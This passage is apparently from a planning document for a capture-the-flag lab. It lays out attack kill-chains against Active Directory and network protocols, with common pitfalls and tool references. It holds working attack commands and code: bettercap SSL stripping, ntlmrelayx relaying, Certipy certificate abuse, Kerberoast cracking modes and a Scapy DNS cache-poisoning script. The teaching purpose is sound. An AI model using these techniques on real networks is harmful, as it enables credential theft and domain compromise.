TTP: T1557.002 (Credential Access, Collection)

**Stage 2 — HTTPS Downgrade**
```
# Continue in bettercap console:
set https.proxy.sslstrip true
https.proxy on
net.sniff on
```
Expected output: Bettercap captures HTTP POSTs with credentials:
```
[net.sniff] POST /login -> username=admin&password=FLAG_PASSWORD
```
TTP: T1557.002, T1040 (Credential Access)

**HSTS caveat:** Sites with HSTS preloading (e.g., Google, major banks) cannot be SSL-stripped. Lab must use a victim service with HTTP or a non-HSTS HTTPS service. The CTF flag service must be configured to serve over HTTP or HTTPS without HSTS headers for this attack to work. This is a VM build constraint, not a kill-chain problem — document it here for Phase 3 VM builders.

**Stage 3 — Use Credentials for Flag**
Use captured credentials to authenticate to the flag service:
```bash
curl -u admin:FLAG_PASSWORD http://VICTIM_IP_B/flag
```

---

### NET-04: DNS Cache Poisoning

**VMs:** Attacker (Kali), DNS Resolver (Ubuntu 22.04 + unbound/bind9 misconfigured)

**Kill-Chain Summary:**
1. Identify DNS resolver on network
2. Verify misconfiguration: source port randomization absent or TXID space small
3. Send legitimate DNS query to resolver to open a lookup to upstream
4. Race: flood resolver with forged DNS responses (spoofed src: upstream authoritative)
5. Resolver caches poisoned answer
6. Target internal service sends HTTP request to attacker-controlled IP
7. HTTP request contains flag

**Stage Detail:**

**Stage 1 — DNS Resolver Recon**
```bash
nmap -p 53 -sU SUBNET/24
# Identify open UDP/53 hosts — DNS resolver candidates
dig @RESOLVER_IP internal.corp.local
# Confirm resolver is forwarding/recursive
```
TTP: T1046 (Discovery — Network Service Scanning)

**Stage 2 — Verify Misconfiguration**
```bash
# Send many queries and observe source port variation:
for i in $(seq 1 20); do dig @RESOLVER_IP test$i.corp.local +short; done
# If source port is always 53 or same port — randomization absent
```
Alternatively, the scenario VM is pre-configured as misconfigured — the lab setup guarantees the attack is feasible. Students identify the misconfiguration by observing it, not by exploiting a random target.

**Stage 3 — Poison the Cache (Scapy-based approach)**
```python
# Scapy DNS cache poisoning (conceptual template):
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR

def poison_response(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # it's a query
        txid = pkt[DNS].id
        spoofed = (
            IP(src=UPSTREAM_DNS_IP, dst=RESOLVER_IP) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(
                id=txid, qr=1, aa=1, rd=1, ra=1,
                qd=DNSQR(qname="internal-service.corp.local"),
                an=DNSRR(rrname="internal-service.corp.local", rdata=ATTACKER_IP)
            )
        )
        send(spoofed, verbose=0)

sniff(filter="udp port 53 and src host RESOLVER_IP", prn=poison_response)
```
TTP: T1557 (Adversary-in-the-Middle — DNS poisoning variant)

**dnschef alternative:**
```bash
sudo dnschef --interface ATTACKER_IP --fakeip ATTACKER_IP --fakedomains internal-service.corp.local
# Simultaneously trigger the resolver to query the poisoned domain
```

**Stage 4 — Intercept HTTP Request**
After cache is poisoned, the internal service sends an HTTP request to attacker IP:
```bash
sudo nc -lvnp 80
# Captures:
# GET /api/heartbeat HTTP/1.1
# Host: internal-service.corp.local
# X-Flag: CTF{...}
```
TTP: T1040 (Collection — Network Sniffing)

**NET-04 Difficulty Note (carried from Phase 1 Open Question #2):** The Kaminsky-style race condition requires guessing the 16-bit transaction ID AND source port simultaneously — this is genuinely hard in real networks. For the lab, the resolver must be pre-configured with a known-bad state: fixed source port (always 53 from resolver), which reduces the attack surface to a 16-bit TXID space that a flood attack can cover in under a second. This is a deliberate misconfiguration, not a random target — the scenario description already implies this ("a DNS resolver deployed in the target network that is misconfigured"). The kill-chain should document the simplified lab variant.

---

## Common Pitfalls

### Pitfall 1: SharpHound Version Mismatch (AD-03)

**What goes wrong:** Student uses a SharpHound binary downloaded from the old BloodHound-Legacy GitHub repository. It collects data, creates a ZIP, but when uploaded to BloodHound CE, the ingest fails silently or produces empty graphs.

**Why it happens:** BloodHound CE uses a completely different schema and API from legacy BloodHound. The CE SharpHound produces CE-format JSON; legacy SharpHound produces legacy format JSON. The two are not compatible.

**How to avoid:** The kill-chain write-up must explicitly state: download SharpHound from the BloodHound CE web UI at Settings → Download Collectors. Do not use any pre-staged SharpHound binary from an external source unless it was obtained from the CE UI for the specific CE version deployed.

**Warning signs:** BloodHound CE imports the ZIP without error but the "Nodes" counter stays at zero after import.

[VERIFIED: bloodhound.specterops.io/collect-data/ce-collection/sharphound — official CE collection documentation]

---

### Pitfall 2: ntlmrelayx LDAPS Requirement (NET-02)

**What goes wrong:** Student runs `ntlmrelayx.py -t ldap://DC_IP` (not `ldaps://`) and no account is created. The relay appears to succeed (authentication completes) but nothing happens in AD.

**Why it happens:** Creating accounts via LDAP requires signing or channel binding on modern Windows. LDAPS (TLS) satisfies this; plaintext LDAP does not. Microsoft has been progressively hardening this since 2019.

**How to avoid:** Kill-chain write-up must use `-t ldaps://DC_IP` explicitly and note the TLS requirement. The lab DC should have a self-signed certificate on port 636 (default for domain controllers with ADCS installed).

**Warning signs:** ntlmrelayx shows `LDAP Auth successful` but no new computer account appears in AD (`nxc ldap DC_IP -u lowpriv -p Pass --computers`).

[VERIFIED: multiple community sources on mitm6 + ntlmrelayx; TLS requirement confirmed]

---

### Pitfall 3: Responder and ntlmrelayx Both Running (AD-02, AD-05, NET-01)

**What goes wrong:** Student runs both Responder (default mode) and ntlmrelayx simultaneously without modifying Responder.conf. Responder's SMB and HTTP servers intercept the authentication before ntlmrelayx can relay it. The hash is captured by Responder, not relayed by ntlmrelayx — cracking is needed, defeating the purpose of the relay.

**How to avoid:** Before starting any relay scenario: edit `/etc/responder/Responder.conf` and set `SMB = Off` and `HTTP = Off`. Responder still handles LLMNR/NBT-NS poisoning; ntlmrelayx handles the authentication relay.

**Warning signs:** Responder shows `NTLMv2-SSP Hash` captured. ntlmrelayx shows no relay events.

[VERIFIED: TCM Security SMB relay writeup; multiple community guides confirm this as the most common beginner mistake]

---

### Pitfall 4: HSTS Breaks NET-03 on Certain Target Sites

**What goes wrong:** Student attempts to SSL-strip a target service that has HSTS headers or is in browser preload lists. The browser refuses to connect over HTTP regardless of the ARP poison.

**Why it happens:** HSTS instructs the browser to always use HTTPS for a domain. SSLstrip can't downgrade a connection the browser refuses to initiate in plaintext.

**How to avoid:** The lab's victim service MUST be either HTTP-only or HTTPS without HSTS headers. The kill-chain write-up should note: this attack demonstrates the risk in environments WITHOUT HSTS. HSTS is the primary defense.

**In kill-chain instructions:** Document that the lab flag service serves over HTTP (or HTTPS without HSTS) as a deliberate misconfiguration.

[VERIFIED: bettercap documentation + HSTS RFC — HSTS prevents this attack class]

---

### Pitfall 5: Certipy ESC1 Certificate Request Fails (AD-04)

**What goes wrong:** `certipy req` exits with an error like `ERROR: The requested certificate template is not supported by this CA` or the certificate request is denied without explanation.

**Why it happens (three common causes):**
1. The template name in `-template` doesn't match the `Template Name` field exactly (case-sensitive)
2. The CA name in `-ca` doesn't match the exact CA name from `certipy find` output
3. The user account doesn't have enrollment rights on that template (verify with `certipy find -vulnerable -stdout`)

**How to avoid:** Copy template name and CA name character-for-character from `certipy find -vulnerable -stdout` output. Do not guess; the field values are exact strings.

[VERIFIED: hivesecurity.gitlab.io Certipy ESC1 guide — CA and template name precision requirement confirmed]

---

### Pitfall 6: AES Kerberos Tickets in AD-01 / AD-05

**What goes wrong:** Student runs `hashcat -m 13100` on hashes that start with `$krb5tgs$18$` (AES-256) instead of `$krb5tgs$23$` (RC4). Hashcat reports 0 hashes loaded.

**Why it happens:** Modern domains disable RC4 for Kerberos. The ticket prefix encodes the encryption type: `$23$` = RC4, `$17$` = AES-128, `$18$` = AES-256.

**How to avoid:** Inspect the first few characters of each hash before running hashcat. Match mode to prefix:
- `$krb5tgs$23$` → mode 13100
- `$krb5tgs$17$` → mode 19600
- `$krb5tgs$18$` → mode 19700
- `$krb5asrep$23$` → mode 18200

Prefer RC4 if the domain allows it. Lab should configure service accounts with RC4 support (`msDS-SupportedEncryptionTypes` not locked to AES-only).

[VERIFIED: hashcat/hashcat GitHub PR #1955 — modes 19600 and 19700 confirmed; HackTricks Kerberoast page confirms prefix encoding]

---

### Pitfall 7: BloodHound CE Not Running Before SharpHound Collection

**What goes wrong:** Student collects SharpHound data and immediately tries to upload, but BloodHound CE is not yet running. The ZIP is uploaded to a dead process.

**How to avoid:** BloodHound CE runs via Docker Compose. Kill-chain must specify:
```bash
# Verify BloodHound CE is running before collection:
docker ps | grep bloodhound
# Should show: bloodhound, bloodhound-db (postgres), and optionally neo4j
```
The CE docker-compose.yml is at `~/BloodHound/docker-compose.yml` (location varies by install). Web UI at `http://localhost:8080`.

[VERIFIED: specterops.io BloodHound CE documentation]

---

## Verification Commands Reference

Commands for pre-flight checks common to multiple scenarios:

```bash
# Check SMB signing across subnet (prerequisite for AD-02, AD-05, NET-01):
nxc smb SUBNET/24 --gen-relay-list targets.txt

# Enumerate domain users (prerequisite for AD-01 SPN targeting):
nxc ldap DC_IP -u lowpriv -p Pass --users

# Verify ADCS is running on DC (prerequisite for AD-04):
nxc ldap DC_IP -u lowpriv -p Pass -M adcs

# Verify WinRM is open on target (prerequisite for AD-05 second hop):
nxc winrm TARGET_IP -u user -p pass

# Verify Responder.conf has SMB=Off HTTP=Off before relay scenarios:
grep -E "^(SMB|HTTP)" /etc/responder/Responder.conf
```

---

## Architecture Patterns

### Kill-Chain Document Structure

```
docs/KILL-CHAINS.md
├── ## Methodology
│   ├── Kill-Chain Stage Format (field definitions)
│   ├── TTP Citation Style
│   ├── Flag Placement Convention
│   └── VM Role Labeling
│
├── ## Active Directory / Windows Kill-Chains
│   ├── AD-01: Kerberoasting and AS-REP Roasting
│   ├── AD-02: LLMNR/NBT-NS Poisoning and NTLM Relay
│   ├── AD-03: BloodHound ACL Abuse Path
│   ├── AD-04: ADCS ESC1 Certificate Abuse
│   └── AD-05: Conti-Style APT Chain [2 flags]
│
└── ## Network Protocol Exploitation Kill-Chains
    ├── NET-01: SMB Relay via Unsigned Shares
    ├── NET-02: IPv6 Rogue DHCPv6 and LDAP Relay
    ├── NET-03: ARP Cache Poisoning and Credential Interception
    └── NET-04: DNS Cache Poisoning
```

### Scenario Data Flow Diagram

```
AD-01: Attacker → [LDAP enumerate SPNs] → DC → [TGS request] → DC
                    GetUserSPNs.py / nxc            Kerberos TGT exchange
       Attacker ← [TGS hash] → [offline hashcat]
                                        ↓
                                 Cracked password → Flag

AD-02: Attacker → [LLMNR poison] → Broadcast net → Victim authenticates to Attacker
       Attacker → [relay] → MemberSrv → [command exec] → Flag

AD-03: Attacker → [SharpHound CE] → MemberSrv/DC → [ZIP upload] → BloodHound CE
       BloodHound → [ACL edge identified] → WriteDACL on DA group
       Attacker → [PowerView] → [Add self to DA] → [secretsdump / WinRM] → Flag

AD-04: Attacker → [certipy find] → DC → [ESC1 template identified]
       Attacker → [certipy req -upn admin] → CA → [rogue cert issued]
       Attacker → [certipy auth -pfx] → DC → [NT hash returned]
       Attacker → [evil-winrm -H NTHASH] → DC → Flag

AD-05: Attacker → [LLMNR relay] → MemberSrv → [Flag 1]
       Attacker ← Rubeus kerberoast → [offline crack] → Attacker
       Attacker → [evil-winrm] → DC → [Flag 2]

NET-01: Attacker → [Responder -A / analysis] → observes LLMNR traffic
        Attacker → [ntlmrelayx relay] → Victim share → Flag

NET-02: Attacker → [mitm6 DHCPv6] → Windows hosts → WPAD auth
        Attacker → [ntlmrelayx -t ldaps] → DC → new account created
        Attacker → [nxc / getST] → DC share → Flag

NET-03: Attacker → [bettercap ARP spoof] → Victim-A, Victim-B (both poisoned)
        Victim-A traffic → Attacker → [SSL strip] → plaintext credentials
        Attacker uses credentials → Flag

NET-04: Attacker → [Scapy DNS race] → Resolver (poisoned cache)
        Internal service → [DNS lookup] → Resolver → Attacker IP
        Internal service → [HTTP request] → Attacker → Flag in request
```

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Kerberos ticket requests | Custom Kerberos implementation | Impacket GetUserSPNs.py or Rubeus | Kerberos protocol has version negotiation edge cases; Impacket handles all etype variants |
| NTLM relay logic | Custom relay server | ntlmrelayx.py (Impacket) | NTLM relay requires precise message timing and signing negotiation; existing tools handle modern SMB2/NTLM variants |
| LDAP queries to AD | Custom LDAP client | nxc ldap / LDAP3 / Impacket ldap3 | AD's LDAP dialect has quirks (referrals, paged results, SASL); existing tools handle them |
| AD CS certificate requests | Manual PKCS#10 construction | Certipy | CA communication uses MS-WCCE (DCOM protocol); Certipy encapsulates this correctly |
| ARP poisoning | Custom ARP sender | bettercap or scapy | ARP poisoning requires bidirectional (fullduplex) attack and IP forwarding; bettercap handles kernel forwarding table management |
| DNS poisoning | Custom UDP flooder | Scapy with sniff callback | Scapy's packet capture + inject loop is the minimum viable approach; building a DNS parsing layer from scratch adds no learning value |

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| CrackMapExec (CME) | NetExec (nxc) | 2023 | Use `nxc smb`, `nxc ldap`, `nxc winrm` — `cme` is archived |
| BloodHound legacy (JS + Python) | BloodHound CE (Docker Compose) | 2023 | CE-only SharpHound required; legacy collectors rejected |
| Certipy v3/v4 | Certipy v5+ | 2024 | ESC1–ESC16 coverage; `-vulnerable` flag filters enumeration output |
| hashcat mode 13100 only | 13100 (RC4) + 19600 (AES-128) + 19700 (AES-256) | Modes 19600/19700 added circa 2019 | Modern domains may disable RC4; AES modes required |
| Responder + Metasploit | Responder + ntlmrelayx | Always — Metasploit excluded | ntlmrelayx is the canonical relay tool; `-smb2support` required for modern Windows |
| Legacy SharpHound PS1 | SharpHound CE binary (downloaded from CE UI) | CE launch 2023 | PS1-based SharpHound from BloodHound-Legacy does not produce CE-compatible output |

---

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | mitm6 maps to T1557.001 in MITRE ATT&CK by structural equivalence — it is not explicitly named in the technique's procedure examples | MITRE TTP Reference — NET-02 | Low — mitm6 achieves the same AiTM outcome as LLMNR poisoning; instructor would accept T1557 parent as an alternative citation |
| A2 | T1222.001 is the closest MITRE TTP for WriteDACL abuse on AD objects; no dedicated AD DACL sub-technique exists | MITRE TTP Reference — AD-03 | Low — the absence of a dedicated TTP is a MITRE ATT&CK framework gap; T1222.001 + T1098 is the standard community mapping and will be recognized by any red team professional |
| A3 | The attack.mitre.org T1557.001 technique name is "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay" — the "Name Resolution Poisoning" name seen in some sources is from an earlier version | MITRE TTP Reference | Very low — both names appear in different search results; full name fetched from official page used |
| A4 | NET-04 lab resolver is configured with fixed source port (no randomization) — the simplified lab variant of DNS cache poisoning | Per-Scenario Kill-Chain — NET-04 | Medium — if the lab uses proper source port randomization, the attack becomes a genuine race condition requiring many thousands of forged packets; the kill-chain should note both approaches |

---

## Open Questions (RESOLVED)

1. **AD-03 ACL abuse chain — WriteDACL vs GenericWrite starting point**
   - What we know: BloodHound CE may surface either WriteDACL (on group) or GenericWrite (on user) as the available edge, depending on the lab's AD configuration.
   - What's unclear: The kill-chain specifies both paths, but only one will be present in the lab. The planner should decide which edge to configure (WriteDACL on Domain Admins group is simpler for students; GenericWrite on a high-priv user is slightly more complex).
   - Recommendation: Configure WriteDACL on Domain Admins as the primary path. Mention GenericWrite in the kill-chain as an alternative for completeness.

2. **NET-04 Scapy approach vs dnschef**
   - What we know: Two viable tools — Scapy (write-your-own approach, consistent with the "no automation" spirit) vs dnschef (purpose-built DNS tool, no code required).
   - What's unclear: Which approach better serves the learning outcome?
   - Recommendation: Use the Scapy approach as the primary path (students write the packet injection script). Include dnschef as a verification step. This aligns with the lab's "understand the technique" ethos and ensures students engage with DNS protocol structure.

3. **AD-05 Rubeus staging — pre-staged or uploaded via relay shell?**
   - What we know: Rubeus.exe is a Windows binary. The relay shell (ntlmrelayx -i + nc) gives file write capability to the member server.
   - What's unclear: Whether students should upload Rubeus via the relay shell (realistic) or find it pre-staged on the victim (simpler).
   - Recommendation: Pre-stage Rubeus at a known path (`C:\Tools\Rubeus.exe`) on the member server. Students discover it through enumeration. This avoids the fragility of binary upload over an SMB relay interactive session while maintaining realism.

---

## Environment Availability

Step 2.6: No external runtimes or cloud services needed — this is a pure documentation phase producing `docs/KILL-CHAINS.md`. All tools referenced (Certipy, nxc, ntlmrelayx, etc.) are attacker-VM tools, not build/test dependencies of the documentation task itself.

---

## Validation Architecture

`nyquist_validation: false` in `.planning/config.json` — Validation Architecture section omitted.

---

## Security Domain

This is a documentation phase. No running software or user input to secure. The output document describes attack techniques for educational purposes.

---

## Sources

### Primary (HIGH confidence — official pages fetched directly)

- [MITRE ATT&CK T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) — TTP ID, tactic, description confirmed
- [MITRE ATT&CK T1558.004 AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) — TTP ID, tactic confirmed
- [MITRE ATT&CK T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) — TTP ID, full name, tactic confirmed
- [MITRE ATT&CK T1557.002 ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002/) — TTP ID, tactics (Credential Access + Collection) confirmed
- [MITRE ATT&CK T1649 Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) — AD CS / ESC1 mapping confirmed explicitly in description
- [MITRE ATT&CK T1484 Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484/) — sub-techniques T1484.001 and T1484.002 confirmed
- [MITRE ATT&CK T1087.002 Domain Account Discovery](https://attack.mitre.org/techniques/T1087/002/) — tactic (Discovery) confirmed
- [MITRE ATT&CK Software S0521 BloodHound](https://attack.mitre.org/software/S0521/) — all associated TTPs (T1087.001, T1087.002, T1069.001, T1069.002, T1018, T1033, T1482, T1615) confirmed from official page
- [Certipy ESC1 — hivesecurity.gitlab.io](https://hivesecurity.gitlab.io/blog/adcs-abuse-certipy-esc1-esc8-attack-chains/) — three exact command forms (find, req, auth) verified with full syntax
- [BloodHound CE SharpHound Collection — bloodhound.specterops.io](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound) — CE-only collector, ZIP upload process, version-matching confirmed
- [hashcat PR #1955 — modes 19600/19700](https://github.com/hashcat/hashcat/pull/1955) — AES128 (19600) and AES256 (19700) Kerberoasting modes confirmed
- [CAPEC-142 DNS Cache Poisoning](https://capec.mitre.org/data/definitions/142.html) — confirmed as CAPEC, not an ATT&CK Enterprise sub-technique

### Secondary (MEDIUM confidence — community sources cross-verified)

- [Impacket GetUserSPNs.py GitHub](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) — command syntax confirmed
- [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay) — ntlmrelayx flags and SMB2 support confirmed
- [The Hacker Recipes — BloodHound CE](https://www.thehacker.recipes/ad/recon/bloodhound/) — collection flow confirmed
- [HackTricks Kerberoast](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html) — hashcat mode 13100 confirmed; mode 19600/19700 cross-referenced
- [Certipy Wiki — Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) — ESC1 three-condition requirement confirmed (referenced in Phase 1 research)
- [ired.team — Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) — WriteDACL + PowerView Add-DomainObjectAcl chain confirmed
- [WriteDacl — bloodhound.specterops.io/resources/edges](https://bloodhound.specterops.io/resources/edges/write-dacl) — SpecterOps official edge documentation for WriteDACL in BloodHound CE
- [Resecurity: MITM6 + NTLM Relay](https://www.resecurity.com/blog/article/mitm6-ntlm-relay-how-ipv6-auto-configuration-leads-to-full-domain-compromise) — mitm6 + ntlmrelayx -t ldaps:// attack flow confirmed
- [0xCZR NTLM Relay Cheatsheet 2025](https://www.0xczr.com/tools/NTLM_Relay_Cheatsheet/) — current ntlmrelayx flags confirmed
- [Picus Security — AS-REP Roasting (T1558.004)](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004) — technique confirmed against official MITRE page
- [DNS Cache Poisoning with Scapy (JHU lab / CSAW CTF context)](https://github.com/mistahenry/DNS-Cache-Poisoning-with-Scapy) — Scapy-based poisoning approach confirmed; TTL-based timing window documented
- [Evolve Security — SMB Relay attacks](https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-smb-relay-attacks-with-responder-and-ntlmrelayx) — Responder analysis mode (-A) and Responder.conf SMB/HTTP=Off requirement confirmed

### Tertiary (LOW confidence — used for background context only)

- Various HTB writeup collections and OSCP notes — confirmed lack of a universal structured kill-chain format standard; confirmed second-person imperative style as convention
- [PNPT certification overview (TCM Security)](https://certifications.tcm-sec.com/pnpt/) — confirmed kill-chain stages derived from pentesting methodology, not a published format standard

---

## Metadata

**Confidence breakdown:**
- Kill-chain format recommendation: MEDIUM — no formal published standard exists; recommendation is derived from synthesis of community conventions, with reasoning documented
- MITRE ATT&CK TTP codes (AD domain): HIGH — all AD TTP codes verified against official attack.mitre.org pages
- MITRE ATT&CK TTP codes (NET domain): HIGH — T1557.001 and T1557.002 verified from official pages; T1039/T1040 are well-established collection TTPs
- Command syntax (Impacket tools): HIGH — GetUserSPNs.py, ntlmrelayx verified against active GitHub repo
- Command syntax (Certipy): HIGH — three exact commands verified against hivesecurity blog (official Certipy-adjacent documentation)
- Command syntax (BloodHound CE SharpHound): HIGH — CE collection flow verified at bloodhound.specterops.io
- Command syntax (bettercap ARP/HTTPS): MEDIUM — verified via bettercap official docs and community writeups; exact console syntax stable
- NET-04 DNS poisoning approach: MEDIUM — Scapy pattern confirmed; exact timing of attack depends on lab resolver configuration
- AD-03 T1222.001 as WriteDACL TTP: MEDIUM — community consensus mapping; no official ATT&CK sub-technique exists for AD DACL objects

**Research date:** 2026-06-12
**Valid until:** 2026-12-12 (stable attack domain — tool syntax may drift; MITRE TTP IDs are stable)
